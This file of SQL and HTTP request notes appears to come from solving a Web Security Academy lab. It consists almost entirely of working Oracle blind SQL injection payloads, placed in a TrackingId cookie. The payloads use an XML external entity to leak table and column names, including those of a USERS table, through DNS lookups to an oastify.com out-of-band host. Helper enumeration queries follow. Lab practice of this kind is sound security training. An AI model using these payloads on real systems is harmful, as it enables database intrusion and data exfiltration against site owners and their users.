/*
Example request of how this can be used

GET /filter?category=Food+%26+Drink HTTP/2
Host: 0a7f0039031ea6678033359800e700cf.web-security-academy.net
Cookie: TrackingId=6wPjWFs9u3KZZHbF'<@urlencode>||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT result_string FROM (SELECT REGEXP_REPLACE(table_name, '[^a-zA-Z0-9\.]', '') AS result_string, ROWNUM rn FROM all_tables)WHERE rn = 3)||'.lnc2moexe1iw2bvptrykvy58rzxqlh96.oastify.com/"> %remote;]>'),'/l') FROM dual)||</@urlencode>'; session=26jQm1QKlehSHTzuum2V505MiDnmyuW4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
*/

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT result_string FROM (SELECT REGEXP_REPLACE(table_name, '[^a-zA-Z0-9\.]', '') AS result_string, ROWNUM rn FROM all_tables)WHERE rn = 3)||'.lnc2moexe1iw2bvptrykvy58rzxqlh96.oastify.com/"> %remote;]>'),'/l') FROM dual

/*
GET /filter?category=Food+%26+Drink HTTP/2
Host: 0a7f0039031ea6678033359800e700cf.web-security-academy.net
Cookie: TrackingId=6wPjWFs9u3KZZHbF'<@urlencode>||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT result_string FROM (SELECT REGEXP_REPLACE(column_name, '[^a-zA-Z0-9\.]', '') AS result_string, ROWNUM rn FROM all_tab_columns WHERE table_name='USERS') WHERE rn = 2)||'.lnc2moexe1iw2bvptrykvy58rzxqlh96.oastify.com/"> %remote;]>'),'/l') FROM dual)||</@urlencode>'; session=26jQm1QKlehSHTzuum2V505MiDnmyuW4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
*/

SELECT result_string
FROM (
    SELECT REGEXP_REPLACE(column_name, '[^a-zA-Z0-9\.]', '') AS result_string,
           ROWNUM rn
    FROM all_tab_columns
    WHERE table_name = 'TABLE-NAME-HERE'
)
WHERE rn = 3